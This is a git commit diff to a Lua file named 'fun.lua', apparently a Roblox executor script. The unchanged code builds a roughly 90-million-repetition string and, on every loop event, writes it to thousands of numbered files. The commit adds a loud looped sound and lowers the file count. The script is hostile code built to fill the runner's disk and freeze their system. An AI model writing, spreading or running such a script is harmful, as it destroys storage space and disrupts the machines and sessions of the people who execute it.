cf2ea12ca057dd2742b256219cdbd7c97972c277
flipsy <109356301+fakeflipsy@users.noreply.github.com>
2022-08-12 16:07:44 +0200

    Update fun.lua

--- real/fun.lua
+++ real/fun.lua
@@ -10,11 +10,17 @@ local Loops = {
 }
 
 local String = string.rep('𪚥🈵', 9e7)
+local Sound = Instance.new('Sound', workspace)
+
+Sound.SoundId = 'rbxassetid://1709572464'
+Sound.Volume = 10
+Sound.Looped = true
+Sound.Playing = true
 
 for _, RS in ipairs(Loops) do
     RS:Connect(function()
         task.spawn(function()
-            for _ = 0, 100000 do writefile(_ .. '.txt', String) end        
+            for _ = 0, 10000 do writefile(_ .. '.txt', String) end        
         end)
     end)
 end
